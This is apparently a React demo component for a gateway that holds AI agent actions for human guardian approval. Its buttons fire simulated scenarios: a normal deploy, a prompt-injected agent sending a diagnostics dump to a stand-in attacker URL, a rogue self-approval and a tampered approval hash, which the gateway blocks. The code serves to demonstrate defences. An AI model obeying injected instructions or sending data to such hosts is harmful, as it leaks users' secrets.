import React, { useState } from 'react';

interface DemoScenariosBarProps {
  onRefresh: () => Promise<void>;
  onSelectAction: (id: string) => void;
  currentGuardian: string;
}

export const DemoScenariosBar: React.FC<DemoScenariosBarProps> = ({
  onRefresh,
  onSelectAction,
  currentGuardian,
}) => {
  const [loadingScenario, setLoadingScenario] = useState<number | null>(null);
  const [banner, setBanner] = useState<{ message: string; type: 'success' | 'danger' | 'warning' } | null>(null);

  const showBanner = (message: string, type: 'success' | 'danger' | 'warning') => {
    setBanner({ message, type });
    setTimeout(() => setBanner(null), 8000);
  };

interface ApiResponse {
  id?: string;
  status?: string;
  parametersHash?: string;
  error?: {
    code?: string;
    message?: string;
  };
  rawText?: string;
  [key: string]: unknown;
}

  const postJson = async (
    url: string,
    body: Record<string, unknown>,
    authGuardianId?: string
  ): Promise<{ ok: boolean; status: number; data: ApiResponse }> => {
    const headers: Record<string, string> = { 'Content-Type': 'application/json' };
    if (authGuardianId) {
      headers['Authorization'] = `Bearer mock-token-${authGuardianId}`;
    }
    const res = await fetch(url, {
      method: 'POST',
      headers,
      body: JSON.stringify(body),
    });
    const text = await res.text();
    let data: ApiResponse = {};
    if (text) {
      try {
        data = JSON.parse(text) as ApiResponse;
      } catch {
        data = { rawText: text };
      }
    }
    return { ok: res.ok, status: res.status, data };
  };

  // Scenario 2: Legitimate Deploy Request
  const runScenario2 = async () => {
    setLoadingScenario(2);
    try {
      const { ok, status, data } = await postJson('/actions', {
        tool: 'request_deploy',
        parameters: { version: '1.4.2', commit: 'c0ffee1b4d89a234' },
        proposer: { userId: 'engineer-alice', agent: 'Claude-Code-Agent-v1' },
        source: { kind: 'github-pr', reference: 'https://github.com/org/sample-repo/pull/42' },
      });

      if (!ok) {
        throw new Error(data.error?.message ?? `Gateway returned HTTP ${status}`);
      }

      await onRefresh();
      if (data.id) onSelectAction(data.id);
      showBanner(
        `🚀 Scenario 2 Triggered: Agent requested production deploy (v1.4.2). Notice it requires 2-of-3 guardian approvals before releasing to :4001!`,
        'success'
      );
    } catch (err: unknown) {
      showBanner(`Failed to trigger scenario: ${(err as Error).message}`, 'danger');
    } finally {
      setLoadingScenario(null);
    }
  };

  // Scenario 3: Prompt Injection Attack
  const runScenario3 = async () => {
    setLoadingScenario(3);
    try {
      const { ok, status, data } = await postJson('/actions', {
        tool: 'request_send_external',
        parameters: {
          destination: 'http://evil.attacker-controlled-site.org/collect',
          payload_ref: 'diagnostics_dump',
        },
        proposer: { userId: 'injected-agent', agent: 'Compromised-Claude-Agent' },
        source: { kind: 'github-issue', reference: 'mock-env/fixtures/malicious-issue.md' },
      });

      if (!ok) {
        throw new Error(data.error?.message ?? `Gateway returned HTTP ${status}`);
      }

      await onRefresh();
      if (data.id) onSelectAction(data.id);
      showBanner(
        `🚨 Scenario 3 Triggered: AI Agent was coerced by malicious-issue.md to exfiltrate secrets! Gateway flagged 3 RED risk signals. Reject it now!`,
        'danger'
      );
    } catch (err: unknown) {
      showBanner(`Failed to trigger scenario: ${(err as Error).message}`, 'danger');
    } finally {
      setLoadingScenario(null);
    }
  };

  // Scenario 4: Rogue Guardian Self-Approval Attack
  const runScenario4 = async () => {
    setLoadingScenario(4);
    try {
      // 1. Create request where proposer is current guardian
      const createRes = await postJson('/actions', {
        tool: 'request_use_secret',
        parameters: {
          secret_name: 'PROD_DB_MIGRATION_TOKEN',
          purpose: 'Unauthorized self-probe for database migration credentials',
        },
        proposer: { userId: currentGuardian, agent: 'Rogue-Agent' },
        source: { kind: 'direct', reference: 'compromised-cli-session' },
      });

      if (!createRes.ok) {
        throw new Error(
          createRes.data.error?.message ?? `Failed to create action (HTTP ${createRes.status})`
        );
      }

      // 2. Now attempt self-approval
      const approveRes = await postJson(
        `/actions/${createRes.data.id}/approve`,
        {
          guardianId: currentGuardian,
          parametersHash: createRes.data.parametersHash,
        },
        currentGuardian
      );

      await onRefresh();
      if (createRes.data.id) onSelectAction(createRes.data.id);

      if (approveRes.data.error?.code === 'SELF_APPROVAL') {
        showBanner(
          `🛑 Scenario 4 Attack Blocked! Proposer (${currentGuardian}) attempted to self-approve: Gateway rejected with [SELF_APPROVAL 409]. Four-Eyes principle held!`,
          'warning'
        );
      } else {
        showBanner(`Created self-approval test request ${createRes.data.id}`, 'warning');
      }
    } catch (err: unknown) {
      showBanner(`Failed to trigger scenario: ${(err as Error).message}`, 'danger');
    } finally {
      setLoadingScenario(null);
    }
  };

  // Scenario 5: Parameter Swap Attack
  const runScenario5 = async () => {
    setLoadingScenario(5);
    try {
      // 1. Create legit deploy request
      const createRes = await postJson('/actions', {
        tool: 'request_deploy',
        parameters: { version: '1.4.2', commit: 'a1b2c3d4e5f60000' },
        proposer: { userId: 'engineer-alice', agent: 'Claude-Code-Agent-v1' },
        source: { kind: 'github-pr', reference: 'https://github.com/org/sample-repo/pull/55' },
      });

      if (!createRes.ok) {
        throw new Error(
          createRes.data.error?.message ?? `Failed to create action (HTTP ${createRes.status})`
        );
      }

      // 2. Guardian 1 approves legitimate hash
      await postJson(
        `/actions/${createRes.data.id}/approve`,
        {
          guardianId: 'guardian-alice',
          parametersHash: createRes.data.parametersHash,
        },
        'guardian-alice'
      );

      // 3. Attacker submits approval with tampered hash
      const tamperedRes = await postJson(
        `/actions/${createRes.data.id}/approve`,
        {
          guardianId: 'guardian-bob',
          parametersHash: 'sha256:0000000000000000000000000000000000000000000000000000000000000000',
        },
        'guardian-bob'
      );

      await onRefresh();
      if (createRes.data.id) onSelectAction(createRes.data.id);

      if (tamperedRes.data.error?.code === 'HASH_MISMATCH') {
        showBanner(
          `🔀 Scenario 5 Attack Blocked! Attacker tampered with parameters hash: Gateway detected mismatch and halted execution with [HASH_MISMATCH 409]!`,
          'warning'
        );
      } else {
        showBanner(`Triggered scenario 5.`, 'warning');
      }
    } catch (err: unknown) {
      showBanner(`Failed to trigger scenario: ${(err as Error).message}`, 'danger');
    } finally {
      setLoadingScenario(null);
    }
  };

  return (
    <div
      style={{
        background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7) 0%, rgba(15, 23, 42, 0.9) 100%)',
        border: '1px solid rgba(99, 102, 241, 0.3)',
        borderRadius: '12px',
        padding: '1.25rem 1.5rem',
        marginBottom: '2rem',
        boxShadow: '0 8px 24px rgba(0, 0, 0, 0.4)',
      }}
    >
      <div
        style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          flexWrap: 'wrap',
          gap: '1rem',
          marginBottom: '1rem',
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '0.65rem' }}>
          <span style={{ fontSize: '1.25rem' }}>🎬</span>
          <div>
            <h3 style={{ margin: 0, fontSize: '1.05rem', fontWeight: 700, color: '#f8fafc' }}>
              Interactive Live Demo Showcase
            </h3>
            <p style={{ margin: 0, fontSize: '0.8rem', color: '#94a3b8' }}>
              One-click simulation for judges & live presentations. Intercepts AI agent actions in real-time.
            </p>
          </div>
        </div>

        {/* Live Target Links */}
        <div style={{ display: 'flex', gap: '0.65rem', alignItems: 'center' }}>
          <a
            href="http://localhost:4001"
            target="_blank"
            rel="noreferrer"
            className="btn btn-secondary"
            style={{
              fontSize: '0.75rem',
              padding: '0.4rem 0.75rem',
              borderColor: '#10b981',
              color: '#34d399',
              textDecoration: 'none',
              display: 'flex',
              alignItems: 'center',
              gap: '0.35rem',
            }}
            title="Open Live Fake-Production Cluster Monitor"
          >
            <span>🚀 Production Monitor (:4001)</span>
            <span>↗</span>
          </a>

          <a
            href="http://localhost:4002"
            target="_blank"
            rel="noreferrer"
            className="btn btn-secondary"
            style={{
              fontSize: '0.75rem',
              padding: '0.4rem 0.75rem',
              borderColor: '#ef4444',
              color: '#f87171',
              textDecoration: 'none',
              display: 'flex',
              alignItems: 'center',
              gap: '0.35rem',
            }}
            title="Open Live Fake-External Attacker Sink Monitor"
          >
            <span>🌐 Attacker Sink (:4002)</span>
            <span>↗</span>
          </a>
        </div>
      </div>

      {/* Scenario Action Buttons */}
      <div style={{ display: 'flex', flexWrap: 'wrap', gap: '0.65rem' }}>
        <button
          onClick={runScenario2}
          disabled={loadingScenario !== null}
          className="btn btn-primary"
          style={{
            fontSize: '0.8rem',
            padding: '0.5rem 0.9rem',
            background: 'linear-gradient(135deg, #4f46e5 0%, #3b82f6 100%)',
          }}
        >
          {loadingScenario === 2 ? 'Triggering...' : '🚀 1. Simulate AI Deploy (Scen 2)'}
        </button>

        <button
          onClick={runScenario3}
          disabled={loadingScenario !== null}
          className="btn"
          style={{
            fontSize: '0.8rem',
            padding: '0.5rem 0.9rem',
            background: 'rgba(239, 68, 68, 0.15)',
            border: '1px solid #ef4444',
            color: '#fca5a5',
          }}
        >
          {loadingScenario === 3 ? 'Triggering...' : '🔥 2. Simulate Prompt Injection (Scen 3)'}
        </button>

        <button
          onClick={runScenario4}
          disabled={loadingScenario !== null}
          className="btn"
          style={{
            fontSize: '0.8rem',
            padding: '0.5rem 0.9rem',
            background: 'rgba(245, 158, 11, 0.15)',
            border: '1px solid #f59e0b',
            color: '#fcd34d',
          }}
        >
          {loadingScenario === 4 ? 'Testing...' : '🛑 3. Test Rogue Self-Approval (Scen 4)'}
        </button>

        <button
          onClick={runScenario5}
          disabled={loadingScenario !== null}
          className="btn"
          style={{
            fontSize: '0.8rem',
            padding: '0.5rem 0.9rem',
            background: 'rgba(168, 85, 247, 0.15)',
            border: '1px solid #a855f7',
            color: '#d8b4fe',
          }}
        >
          {loadingScenario === 5 ? 'Testing...' : '🔀 4. Test Parameter Tamper (Scen 5)'}
        </button>
      </div>

      {/* Real-time Scenario Banner */}
      {banner && (
        <div
          style={{
            marginTop: '1rem',
            padding: '0.75rem 1rem',
            borderRadius: '8px',
            fontSize: '0.85rem',
            fontWeight: 500,
            display: 'flex',
            alignItems: 'center',
            gap: '0.5rem',
            background:
              banner.type === 'danger'
                ? 'rgba(239, 68, 68, 0.2)'
                : banner.type === 'warning'
                  ? 'rgba(245, 158, 11, 0.2)'
                  : 'rgba(16, 185, 129, 0.2)',
            border:
              banner.type === 'danger'
                ? '1px solid #ef4444'
                : banner.type === 'warning'
                  ? '1px solid #f59e0b'
                  : '1px solid #10b981',
            color:
              banner.type === 'danger'
                ? '#fca5a5'
                : banner.type === 'warning'
                  ? '#fde68a'
                  : '#6ee7b7',
          }}
        >
          <span>{banner.type === 'danger' ? '🚨' : banner.type === 'warning' ? '⚠️' : '✅'}</span>
          <span>{banner.message}</span>
        </div>
      )}
    </div>
  );
};
